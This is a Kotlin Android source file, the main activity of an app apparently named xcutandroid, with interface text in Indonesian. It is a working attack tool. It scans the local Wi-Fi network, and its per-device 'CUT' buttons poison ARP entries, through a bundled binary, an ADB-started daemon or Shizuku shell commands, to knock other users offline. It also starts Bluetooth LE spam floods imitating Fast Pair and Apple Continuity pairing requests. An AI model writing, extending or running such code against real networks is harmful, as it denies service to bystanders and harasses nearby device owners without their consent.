package com.drybrine.xcutandroid

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Typeface
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.core.app.ActivityCompat
import java.io.File
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import rikka.shizuku.Shizuku

data class Neighbor(val ip: String, val dev: String, val mac: String, val state: String)

class MainActivity : Activity() {

    private val scope = CoroutineScope(Dispatchers.Main)
    private val permissionCode = 1001
    private val blePermCode = 1002

    private lateinit var statusView: TextView
    private lateinit var capView: TextView
    private lateinit var listView: LinearLayout
    private lateinit var logView: TextView

    private var netAdmin = false
    private var netRaw = false
    private var arpBin: File? = null
    private var poisonProc: Process? = null
    private val knownMacs = mutableMapOf<String, String>()

    private val binderReceived = Shizuku.OnBinderReceivedListener {
        runOnUiThread { appendLog("binder received") }
    }
    private val binderDead = Shizuku.OnBinderDeadListener {
        runOnUiThread { appendLog("binder dead") }
    }
    private val permissionResult = Shizuku.OnRequestPermissionResultListener { code, result ->
        runOnUiThread { appendLog("permission request $code -> ${if (result == 0) "GRANTED" else "DENIED"}") }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Shizuku.addBinderReceivedListenerSticky(binderReceived)
        Shizuku.addBinderDeadListener(binderDead)
        Shizuku.addRequestPermissionResultListener(permissionResult)

        statusView = TextView(this).apply { text = "Shizuku: check dulu" }
        capView = TextView(this).apply { typeface = Typeface.MONOSPACE }
        logView = TextView(this).apply {
            typeface = Typeface.MONOSPACE
            textSize = 11f
        }
        listView = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }

        val scroll = ScrollView(this).apply {
            addView(LinearLayout(this@MainActivity).apply {
                orientation = LinearLayout.VERTICAL
                setPadding(24, 24, 24, 24)
                addView(statusView)
                addView(Button(this@MainActivity).apply {
                    text = "Minta izin Shizuku"
                    setOnClickListener { requestPermission() }
                })
                addView(Button(this@MainActivity).apply {
                    text = "Cek status + capability"
                    setOnClickListener { checkStatus() }
                })
                addView(capView)
                addView(TextView(this@MainActivity).apply {
                    text = "--- ADB BOOTSTRAP (tanpa Shizuku, Android 11+) ---"
                    typeface = Typeface.DEFAULT_BOLD
                    setPadding(0, 16, 0, 8)
                })
                addView(Button(this@MainActivity).apply {
                    text = "1. Pair via wireless debugging"
                    setOnClickListener { adbPair() }
                })
                addView(Button(this@MainActivity).apply {
                    text = "2. Start daemon (xcutd)"
                    setOnClickListener { adbStartDaemon() }
                })
                addView(Button(this@MainActivity).apply {
                    text = "Scan (raw ARP)"
                    setOnClickListener { scan() }
                })
                addView(listView)
                addView(TextView(this@MainActivity).apply {
                    text = "--- BLE SPAM (tanpa Shizuku) ---"
                    typeface = Typeface.DEFAULT_BOLD
                    setPadding(0, 24, 0, 8)
                })
                addView(Button(this@MainActivity).apply {
                    text = "Spam: Fast Pair"
                    setOnClickListener { startSpam(SpamType.FASTPAIR) }
                })
                addView(Button(this@MainActivity).apply {
                    text = "Spam: Apple Continuity"
                    setOnClickListener { startSpam(SpamType.CONTINUITY) }
                })
                addView(Button(this@MainActivity).apply {
                    text = "Spam: Generic churn"
                    setOnClickListener { startSpam(SpamType.GENERIC) }
                })
                addView(Button(this@MainActivity).apply {
                    text = "Stop BLE spam"
                    setOnClickListener {
                        startService(Intent(this@MainActivity, BleSpamService::class.java).apply {
                            putExtra(BleSpamService.EXTRA_TYPE, BleSpamService.ACTION_STOP)
                        })
                    }
                })
                addView(logView)
            })
        }
        setContentView(scroll)
    }

    override fun onDestroy() {
        super.onDestroy()
        poisonProc?.destroy()
        Shizuku.removeBinderReceivedListener(binderReceived)
        Shizuku.removeBinderDeadListener(binderDead)
        Shizuku.removeRequestPermissionResultListener(permissionResult)
    }

    private fun requestPermission() {
        if (Shizuku.isPreV11()) {
            appendLog("Shizuku pre-v11: unsupported")
        } else if (Shizuku.checkSelfPermission() == 0) {
            appendLog("izin sudah GRANTED")
        } else {
            Shizuku.requestPermission(permissionCode)
        }
    }

    private fun checkStatus() {
        scope.launch {
            val daemonUp = daemon.isUp()
            var caps = mapOf<String, String>()
            try {
                caps = ShizukuShell.capabilities()
            } catch (e: Exception) {
                appendLog("shizuku shell gagal: $e")
            }
            netAdmin = caps["CAP_NET_ADMIN"] == "true"
            netRaw = caps["CAP_NET_RAW"] == "true"
            statusView.text = if (daemonUp)
                "xcutd daemon: LIVE (raw socket)"
            else
                "Shizuku binder: ${if (Shizuku.pingBinder()) "LIVE" else "MATI"} | xcutd: mati"
            capView.text = buildString {
                append("xcutd daemon: ").append(if (daemonUp) "LIVE" else "MATI").append('\n')
                append("shizuku uid shell: ").append(caps["uid"]).append('\n')
                append("CapEff: ").append(caps["cap_eff"]).append('\n')
                append("CAP_NET_RAW  : ").append(netRaw).append('\n')
                append("CAP_NET_ADMIN: ").append(netAdmin)
            }
            appendLog("backend ARP: ${backendName()}")
        }
    }

    private fun backendName() =
        if (daemonUpFlag) "daemon raw socket (xcutd)"
        else if (netAdmin) "ip neigh via shizuku (NET_ADMIN)"
        else if (netRaw) "raw socket via shizuku (NET_RAW)"
        else "TIDAK ADA - jalankan ADB bootstrap atau Shizuku"

    private var daemonUpFlag = false
    private val daemon = XcutDaemon()
    private val adb = AdbBootstrap(this)
    private var pairHost: String? = null
    private var pairPort = 0
    private var connectHost: String? = null
    private var connectPort = 0

    private fun adbPair() {
        scope.launch {
            appendLog("mencari wireless debugging... (aktifkan di Developer Options)")
            val (pairing, connect) = adb.discover()
            if (pairing.isEmpty() && connect.isEmpty()) {
                appendLog("tidak ditemukan - pastikan Wireless debugging AKTIF di HP")
                return@launch
            }
            val p = pairing.firstOrNull()
            val c = connect.firstOrNull()
            pairHost = p?.host; pairPort = p?.port ?: 0
            connectHost = c?.host; connectPort = c?.port ?: 0
            appendLog("pairing: ${p?.host ?: "-"}:${p?.port ?: "-"} | connect: ${c?.host ?: "-"}:${c?.port ?: "-"}")
            if (p == null) {
                appendLog("port pairing tidak ditemukan")
                return@launch
            }
            val input = android.widget.EditText(this@MainActivity).apply {
                hint = "6 digit code dari layar HP"
                inputType = android.text.InputType.TYPE_CLASS_NUMBER
            }
            android.app.AlertDialog.Builder(this@MainActivity)
                .setTitle("Wireless debugging pairing")
                .setView(input)
                .setPositiveButton("Pair") { _, _ ->
                    val code = input.text.toString().trim()
                    scope.launch {
                        try {
                            appendLog("pairing ke ${pairHost}:$pairPort...")
                            adb.pair(pairHost!!, pairPort, code)
                            appendLog("PAIRED OK - key tersimpan")
                        } catch (e: Exception) {
                            appendLog("pairing GAGAL: $e")
                        }
                    }
                }
                .setNegativeButton("Batal", null)
                .show()
        }
    }

    private fun adbStartDaemon() {
        scope.launch {
            try {
                val connect = connectHost
                if (connect == null) {
                    appendLog("belum ada endpoint connect - jalankan Pair dulu")
                    return@launch
                }
                val abi = Build.SUPPORTED_ABIS.firstOrNull()
                    ?: throw IllegalStateException("no abi")
                val binBytes = assets.open("$abi/arp").use { it.readBytes() }
                val b64 = java.util.Base64.getEncoder().encodeToString(binBytes)
                appendLog("push xcutd + start daemon (${binBytes.size} bytes)...")
                adb.startDaemon(connect, connectPort, b64)
                appendLog("daemon started, cek koneksi...")
                if (daemon.isUp()) {
                    daemonUpFlag = true
                    appendLog("xcutd LIVE - raw socket siap")
                } else {
                    appendLog("daemon tidak merespons - cek logcat")
                }
            } catch (e: Exception) {
                appendLog("start daemon GAGAL: $e")
            }
        }
    }

    private fun scan() {
        scope.launch {
            knownMacs.clear()
            val devices = daemonScan()
            if (devices.isEmpty()) {
                val r = ShizukuShell.run("ip neigh")
                val neighDevices = parseNeigh(r.stdout)
                val raw = if (netRaw) rawScan() else emptyList()
                val list = if (netAdmin) neighDevices else if (raw.isNotEmpty()) raw else neighDevices
                listView.removeAllViews()
                list.forEach {
                    if (it.mac.isNotBlank()) knownMacs[it.ip] = it.mac
                    addRow(it)
                }
                if (list.isEmpty()) appendLog("(tidak ada device)")
            } else {
                listView.removeAllViews()
                devices.forEach {
                    if (it.mac.isNotBlank()) knownMacs[it.ip] = it.mac
                    addRow(it)
                }
                appendLog("scan via daemon: ${devices.size} device")
            }
        }
    }

    private suspend fun daemonScan(): List<Neighbor> {
        daemonUpFlag = daemon.isUp()
        if (!daemonUpFlag) return emptyList()
        return try {
            daemon.scan()
        } catch (e: Exception) {
            appendLog("daemon scan gagal: $e")
            daemon.close()
            daemonUpFlag = false
            emptyList()
        }
    }

    private fun extractArpBin(): File? {
        arpBin?.takeIf { it.exists() }?.let { return it }
        val abi = Build.SUPPORTED_ABIS.firstOrNull()
            ?: run { appendLog("no supported abi"); return null }
        return try {
            val out = File(cacheDir, "arp").apply {
                outputStream().use { dst ->
                    assets.open("$abi/arp").use { it.copyTo(dst) }
                }
                setExecutable(true, false)
            }
            arpBin = out
            appendLog("native arp binary: $abi/$out.name")
            out
        } catch (e: Exception) {
            appendLog("extract arp binary gagal: $e")
            null
        }
    }


    private suspend fun rawScan(): List<Neighbor> {
        val bin = extractArpBin() ?: return emptyList()
        val r = ShizukuShell.run("ARP_IFACE=wlan0 ${bin.absolutePath} scan")
        if (r.exit != 0) {
            appendLog("raw scan exit ${r.exit}: ${r.stderr.trim()}")
            return emptyList()
        }
        return r.stdout.lineSequence().mapNotNull { line ->
            val parts = line.trim().split(' ')
            if (parts.size == 2) Neighbor(parts[0], "wlan0", parts[1], "raw") else null
        }.toList()
    }

    private fun parseNeigh(raw: String): List<Neighbor> {
        val re = Regex("([\\d.]+)\\s+dev\\s+(\\S+)\\s+lladdr\\s+([0-9a-fA-F:]+)\\s+(\\S+)")
        return raw.lineSequence().mapNotNull { line ->
            re.find(line)?.let { m ->
                Neighbor(m.groupValues[1], m.groupValues[2], m.groupValues[3], m.groupValues[4])
            }
        }.toList()
    }

    private fun addRow(n: Neighbor) {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setPadding(0, 8, 0, 8)
        }
        row.addView(TextView(this).apply {
            text = "${n.ip}  ${n.mac}  (${n.state})"
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        })
        row.addView(Button(this).apply {
            text = "CUT"
            setOnClickListener { cut(n.ip, n.dev) }
        })
        row.addView(Button(this).apply {
            text = "UNCUT"
            setOnClickListener { uncut(n.ip, n.dev) }
        })
        listView.addView(row)
    }

    private fun cut(ip: String, dev: String) {
        scope.launch {
            if (daemonUpFlag) {
                try {
                    daemon.spoof(ip)
                    appendLog("poison $ip via daemon (raw socket)")
                } catch (e: Exception) {
                    appendLog("daemon spoof gagal: $e")
                    daemon.close()
                    daemonUpFlag = false
                }
            } else if (netAdmin) {
                val r = ShizukuShell.run("ip neigh replace $ip lladdr 00:00:00:00:00:00 dev $dev nud permanent")
                appendLog("cut $ip -> exit ${r.exit} ${r.stderr.trim()}")
            } else if (netRaw) {
                rawSpoof(ip)
            } else {
                appendLog("cut gagal: tidak ada capability. Jalankan 'Cek status' dulu")
            }
        }
    }

    private suspend fun rawSpoof(ip: String) {
        val bin = extractArpBin() ?: return
        poisonProc?.destroy()
        try {
            poisonProc = ShizukuShell.start("${bin.absolutePath} spoof $ip 00:00:00:00:00:00")
            appendLog("poison $ip via raw socket (ARP)")
        } catch (e: Exception) {
            appendLog("spoof gagal: $e")
        }
    }

    private fun uncut(ip: String, dev: String) {
        scope.launch {
            if (daemonUpFlag) {
                try {
                    daemon.stopSpoof()
                    val real = knownMacs[ip]
                    if (real != null) {
                        daemon.restore(ip, real)
                        appendLog("restore $ip via daemon")
                    } else {
                        appendLog("uncut $ip: poison dihentikan (mac asli tak dikenal)")
                    }
                } catch (e: Exception) {
                    appendLog("daemon uncut gagal: $e")
                }
            } else if (netAdmin) {
                val r = ShizukuShell.run("ip neigh del $ip dev $dev")
                appendLog("uncut $ip -> exit ${r.exit} ${r.stderr.trim()}")
            } else {
                poisonProc?.destroy()
                poisonProc = null
                val bin = extractArpBin()
                val real = knownMacs[ip]
                if (bin != null && real != null) {
                    val r = ShizukuShell.run("${bin.absolutePath} restore $ip $real")
                    appendLog("restore $ip -> exit ${r.exit} ${r.stderr.trim()}")
                } else {
                    appendLog("uncut $ip: poison dihentikan (mac asli tak dikenal: $real)")
                }
            }
        }
    }

    private fun startSpam(type: SpamType) {
        if (Build.VERSION.SDK_INT >= 31) {
            val perms = arrayOf(
                Manifest.permission.BLUETOOTH_CONNECT,
                Manifest.permission.BLUETOOTH_ADVERTISE,
            )
            if (perms.any { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }) {
                ActivityCompat.requestPermissions(this, perms, blePermCode)
                pendingSpam = type
                return
            }
        }
        launchSpam(type)
    }

    private var pendingSpam: SpamType? = null

    private fun launchSpam(type: SpamType) {
        val i = Intent(this, BleSpamService::class.java).apply {
            putExtra(BleSpamService.EXTRA_TYPE, type.name)
        }
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
        appendLog("BLE spam dimulai: ${type.label}")
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == blePermCode) {
            val ok = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            appendLog("izin BLE: ${if (ok) "GRANTED" else "DENIED"}")
            if (ok) pendingSpam?.let { launchSpam(it) }
            pendingSpam = null
        }
    }

    private fun appendLog(s: String) {
        logView.append("$s\n")
    }
}
